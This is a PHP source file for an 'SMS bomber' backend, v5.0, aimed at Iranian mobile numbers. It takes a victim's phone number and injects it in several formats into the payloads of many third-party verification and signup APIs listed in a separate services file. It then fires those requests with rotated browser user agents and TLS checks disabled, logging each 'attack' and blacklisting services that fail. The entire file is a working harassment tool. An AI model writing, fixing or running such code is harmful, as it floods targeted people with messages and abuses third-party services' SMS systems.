<?php
// SMS Bomber Backend - v5.0 Fixed
// Fixed: Payload filling logic added (critical fix)
// Fixed: Content-Type handling
// Fixed: Recursive data processing

set_time_limit(0); 
ignore_user_abort(true);

$blacklistFile = 'blacklist.json';
$blacklist = [];
if (file_exists($blacklistFile)) {
    $blacklist = json_decode(file_get_contents($blacklistFile), true) ?? [];
}

// --- ENTRY POINT ---

if (isset($_GET['action']) && $_GET['action'] === 'check') {
    // HEALTH CHECK MODE
    $p = make_phone_formats('09300000000');
    start_bombing($p, 'check');
}
elseif ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $phone = $_POST['phone'] ?? '';
    
    // Clear log for new attack
    file_put_contents('log.txt', '');
    
    if (preg_match('/^09[0-9]{9}$/', $phone)) {
        $p = make_phone_formats($phone);
        start_bombing($p, 'attack');
    } else {
        echo "Invalid Phone Number";
    }
}

// --- HELPERS ---

function make_phone_formats($phone) {
    // phone is 0912...
    $noZero = substr($phone, 1); // 912...
    return [
        'zero' => $phone,                // 09120000000
        'plus' => '+98' . $noZero,       // +989120000000
        'no' => $noZero,                 // 9120000000
        'country' => '98' . $noZero,     // 989120000000
        'c_code' => $noZero              // Fallback
    ];
}

function fill_payload($data, $p) {
    if (!is_array($data)) return $data;

    foreach ($data as $key => $value) {
        if (is_array($value)) {
            // Recursive for nested arrays like ['credential' => ['phoneNumber' => ...]]
            $data[$key] = fill_payload($value, $p);
        } else {
            // Check keys and fill
            $k = strtolower($key);
            
            // Comprehensive Key Matching
            if (strpos($k, 'mobile') !== false || 
                strpos($k, 'phone') !== false || 
                strpos($k, 'cellphone') !== false || 
                strpos($k, 'contact') !== false ||
                strpos($k, 'username') !== false ||
                $k === 'number' || 
                $k === 'tel' ||
                $k === 'identifier'
               ) {
                
                // Heuristic for format based on previous value or key hints
                // If the value in services.php was '98', it might be a hint usually, but here mostly NULL.
                // Standard Iranian APIs usually take 09...
                
                // Exceptions/Specifics can be handled here if needed.
                // For now, 'zero' (09...) is the most standard.
                $data[$key] = $p['zero'];
                
                // Some specific overrides based on known patterns if needed:
                if ($value === '98') $data[$key] = $p['country']; 
                if ($value === '+98') $data[$key] = $p['plus'];
            }
        }
    }
    return $data;
}

// --- MAIN FUNCTION ---

function start_bombing($p, $mode = 'attack') {
    $services = require "services.php";
    $total = count($services);
    
    // Write Meta Log
    file_put_contents('log.txt', json_encode([
        'type' => 'meta', 
        'total' => $total, 
        'mode' => $mode
    ]) . "\n");

    // User Agents
    $uas = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/17.2 Safari/600.8.9',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
    ];

    foreach ($services as $name => $data) {
        // Attack mode: respect blacklist
        if ($mode === 'attack' && is_blacklisted($name)) {
            continue; 
        }

        $url = $data[0];
        $rawPayload = $data[1];
        $method = isset($data[2]) ? $data[2] : 'POST';
        $extraHeaders = isset($data[3]) ? $data[3] : [];
        
        // --- CRITICAL FIX: FILL PAYLOAD ---
        $payload = fill_payload($rawPayload, $p);
        
        $ua = $uas[array_rand($uas)];
        $extraHeaders[] = 'User-Agent: ' . $ua;

        req($url, $payload, $extraHeaders, $method, $name, ($mode === 'check'));
    }
    
    if ($mode === 'check') {
        echo "Check Complete";
    }
}

// --- UTILITIES ---

function is_blacklisted($serviceName) {
    global $blacklist;
    return in_array($serviceName, $blacklist);
}

function add_to_blacklist($serviceName) {
    global $blacklist, $blacklistFile;
    if (!in_array($serviceName, $blacklist)) {
        $blacklist[] = $serviceName;
        file_put_contents($blacklistFile, json_encode($blacklist));
    }
}

function req($url, $data = null, $headers = [], $method = 'POST', $serviceName = 'unknown', $isHealthCheck = false) {
    date_default_timezone_set("Asia/Tehran");
    
    // Convert named methods from services.php
    $isJson = false;
    $isForm = false;
    
    if ($method === 'POST') {
        // Default POST implies JSON usually in these lists, unless data implies otherwise.
        // But safer to assume JSON for 'body' driven APIs.
        $isJson = true; 
    } elseif ($method === 'POST_FORM') {
        $method = 'POST';
        $isForm = true;
    } elseif ($method === 'POST_PARAMS') {
        $method = 'POST';
        $isJson = true;
    } elseif ($method === 'GET') {
        // data should be appended to URL
        if (is_array($data)) {
            $url .= (strpos($url, '?') === false ? '?' : '&') . http_build_query($data);
        }
        $data = null;
    }

    $defaultHeaders = [];
    $postFields = null;

    if ($method === 'POST') {
        if ($isJson && is_array($data)) {
            $defaultHeaders[] = 'Content-Type: application/json';
            $defaultHeaders[] = 'Accept: application/json';
            $postFields = json_encode($data);
        } elseif ($isForm && is_array($data)) {
            $defaultHeaders[] = 'Content-Type: application/x-www-form-urlencoded';
            $postFields = http_build_query($data);
        } else {
             // Fallback or raw string data
             $postFields = $data;
        }
    }

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    if ($method === 'POST') {
        curl_setopt($ch, CURLOPT_POST, true);
        if ($postFields) {
            curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
        }
    } elseif ($method !== 'GET') {
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
    }

    // Merge headers, avoiding duplicates
    $finalHeaders = array_merge($defaultHeaders, $headers);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $finalHeaders);

    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $errno = curl_errno($ch);
    $errorMsg = curl_error($ch);
    curl_close($ch);

    $parsedUrl = parse_url($url);
    $domain = isset($parsedUrl['host']) ? str_replace('www.', '', $parsedUrl['host']) : 'unknown';

    // --- STATUS LOGIC ---
    $statusLabel = "UNKNOWN";
    
    // Strict logic refined
    if ($errno > 0 || $http_code == 0) {
        $statusLabel = "CRITICAL";
        if ($isHealthCheck) add_to_blacklist($serviceName);
    } elseif ($http_code >= 200 && $http_code < 300) {
        // Does response contain error?
        // Some services return 200 but say {"success":false}
        // Simple heuristic: if len is small and contains 'error' or 'false', maybe fail.
        // But let's trust HTTP code for now as "Success" in attack, 
        // because parsing every response logic is impossible generically.
        $statusLabel = "SUCCESS";
        if ($isHealthCheck) $statusLabel = "ALIVE";
    } elseif ($http_code == 429) {
        $statusLabel = "WARN"; // Rate limit
    } else {
        $statusLabel = "ERROR";
        if ($isHealthCheck) add_to_blacklist($serviceName); // Fail in check mode
        // In attack mode, we don't blacklist immediately on 4xx/5xx unless sure? 
        // User wanted strictness. Let's keep strict.
        add_to_blacklist($serviceName);
    }

    $cleanResponse = $response;
    if (strpos($response, '<html') !== false || strpos($response, '<!DOCTYPE') !== false) {
        $cleanResponse = "[HTML Hidden] Len: " . strlen($response);
    } else {
        $cleanResponse = mb_substr($response, 0, 150) . (strlen($response) > 150 ? '...' : '');
    }

    $logEntry = [
        'timestamp' => date("H:i:s"),
        'url' => $url,
        'domain' => $domain,
        'status' => $http_code,
        'response' => $cleanResponse,
        'error' => ($errno ? $errorMsg : ($http_code >= 400 ? "Http $http_code" : "OK")),
        'service' => $serviceName,
        'label' => $statusLabel
    ];
    
    file_put_contents('log.txt', json_encode($logEntry) . "\n", FILE_APPEND);
    usleep(20000); // 0.02s
}
?>